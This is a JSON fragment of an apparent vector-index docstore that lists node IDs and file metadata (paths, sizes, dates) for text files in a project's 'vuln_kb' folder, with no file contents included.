"93d9dda4-c808-4339-9ac9-4e195441b1a0": {"node_ids": ["874f84c6-d7df-4ee3-bfcb-fecfcbbcd1a5"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175638_159709.clean.txt", "file_name": "20250408_175638_159709.clean.txt", "file_type": "text/plain", "file_size": 2444, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "4fdf6083-baf2-439f-9086-a0d64c8a8094": {"node_ids": ["459e93ca-c3e2-4f5c-a911-70e0d7532f8e"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175712_774594.clean.txt", "file_name": "20250408_175712_774594.clean.txt", "file_type": "text/plain", "file_size": 1410, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "040a8228-9f17-4c50-af1d-1fa0c601d4c5": {"node_ids": ["384f11b0-c10b-4e1b-9d1f-2f2cc1b02c99"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175708_149968.clean.txt", "file_name": "20250408_175708_149968.clean.txt", "file_type": "text/plain", "file_size": 2564, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "ec251bbe-b391-4979-8feb-7e797b1e8445": {"node_ids": ["45bf5799-3266-49cd-9a8f-8324e17952d9"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175705_860089.clean.txt", "file_name": "20250408_175705_860089.clean.txt", "file_type": "text/plain", "file_size": 2768, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "54470bbd-d301-4efa-85f7-118ed3e0b1fc": {"node_ids": ["4f010a24-7eca-4fa3-a21f-9c7278baca20"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175656_633215.clean.txt", "file_name": "20250408_175656_633215.clean.txt", "file_type": "text/plain", "file_size": 1123, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "70154f66-d455-4389-b281-1ad3dbaed4db": {"node_ids": ["8bd8b5f9-6a43-4edc-a180-5ee2ce6fdc70"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175654_211238.clean.txt", "file_name": "20250408_175654_211238.clean.txt", "file_type": "text/plain", "file_size": 801, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "6fc335f5-99fb-4dea-b53c-d9e638772efd": {"node_ids": ["0abb049a-adb6-4d97-8704-0b9c0e53940c"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175726_429657.clean.txt", "file_name": "20250408_175726_429657.clean.txt", "file_type": "text/plain", "file_size": 0, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "f9bd4c02-0b26-43a8-bbe2-3d19457d3803": {"node_ids": ["e1615abc-b123-4737-af6f-30bfba8262b2"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175715_093489.clean.txt", "file_name": "20250408_175715_093489.clean.txt", "file_type": "text/plain", "file_size": 564, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "e48968b8-5520-41c0-88b0-81e078df740e": {"node_ids": ["cc478652-75b0-4fb3-88db-86d0a1c5cfee"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175652_047181.clean.txt", "file_name": "20250408_175652_047181.clean.txt", "file_type": "text/plain", "file_size": 763, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "16bb39a7-c794-4fed-a457-54a7d57858b2": {"node_ids": ["6bb31a68-66a7-4ea8-8c7e-8d6feaa98980"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175717_202124.clean.txt", "file_name": "20250408_175717_202124.clean.txt", "file_type": "text/plain", "file_size": 3339, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "cca3e6f0-0eab-4499-a295-398b7fddc898": {"node_ids": ["01a27fd4-d864-4b12-9216-2bd12b2a7092"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175656_491339.clean.txt", "file_name": "20250408_175656_491339.clean.txt", "file_type": "text/plain", "file_size": 1359, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "515a14af-2f83-4fd2-94db-5b2f45552c80": {"node_ids": ["691efd08-5dc9-4a65-8224-b47fd03757a5"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175733_300028.clean.txt", "file_name": "20250408_175733_300028.clean.txt", "file_type": "text/plain", "file_size": 0, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "429e5a9e-f193-49eb-8a6f-9891ba90c94f": {"node_ids": ["5b2fddbf-0e6f-40a9-a7d4-3ef28a61df16"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175726_398236.clean.txt", "file_name": "20250408_175726_398236.clean.txt", "file_type": "text/plain", "file_size": 0, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "c977429e-9ff4-447a-9579-fbcd3b66aee3": {"node_ids": ["c9ad628d-fc37-4b48-b6bb-5a9f6cf43880"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175724_116621.clean.txt", "file_name": "20250408_175724_116621.clean.txt", "file_type": "text/plain", "file_size": 0, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "b5197005-4e01-4bc3-b3cf-67fb4fbb9cb5": {"node_ids": ["7912be38-fbb7-4550-a247-22394fa545b9"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175642_691964.clean.txt", "file_name": "20250408_175642_691964.clean.txt", "file_type": "text/plain", "file_size": 1034, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "314774b2-2445-46f2-a948-3bcffe227cc9": {"node_ids": ["55301459-8c97-4114-a08f-ee6548454ec2"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175724_226922.clean.txt", "file_name": "20250408_175724_226922.clean.txt", "file_type": "text/plain", "file_size": 0, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "c57bf029-dd98-4f3b-bc14-9f2a3d33faed": {"node_ids": ["ef6e7f81-cee3-4830-8259-cf9763420e74"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_172348_873880.clean.txt", "file_name": "20250408_172348_873880.clean.txt", "file_type": "text/plain", "file_size": 3067, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "a7ee91ba-dbb2-44b7-97ab-c85c23d52d5f": {"node_ids": ["d5f23ad1-8cab-4cf4-a870-40f66a2fc906"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175658_962207.clean.txt", "file_name": "20250408_175658_962207.clean.txt", "file_type": "text/plain", "file_size": 3084, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "c3d07fd0-5ae9-4e73-952e-847bec0f3c38": {"node_ids": ["9ad33a76-0035-4a68-bedc-ff0266a17f31"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175710_323925.clean.txt", "file_name": "20250408_175710_323925.clean.txt", "file_type": "text/plain", "file_size": 692, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "3f02949b-80f4-4e11-bd48-794677a70cc6": {"node_ids": ["752b0f82-ca3a-4cae-915c-cdad89dad441", "47fd4883-cef5-4676-9ca3-766841e93699", "73e58829-83b2-4c76-8f74-ec3007785426"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175649_629907.clean.txt", "file_name": "20250408_175649_629907.clean.txt", "file_type": "text/plain", "file_size": 10568, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "ed657c46-fb17-49ce-9b23-eeee031501af": {"node_ids": ["39538dd2-085f-4446-85d6-c858a1ecd839"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175710_435889.clean.txt", "file_name": "20250408_175710_435889.clean.txt", "file_type": "text/plain", "file_size": 959, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "ab250304-7c84-483a-8cd9-7e4a402e447d": {"node_ids": ["97a5a656-8968-4180-b5c9-aea94f144a70"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175721_973714.clean.txt", "file_name": "20250408_175721_973714.clean.txt", "file_type": "text/plain", "file_size": 2398, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "014117e7-2295-456b-bc27-13fb2cbb98bc": {"node_ids": ["010c9a5e-9ad3-4e58-91d9-92cb4123c8bc"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175656_523326.clean.txt", "file_name": "20250408_175656_523326.clean.txt", "file_type": "text/plain", "file_size": 2170, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}}}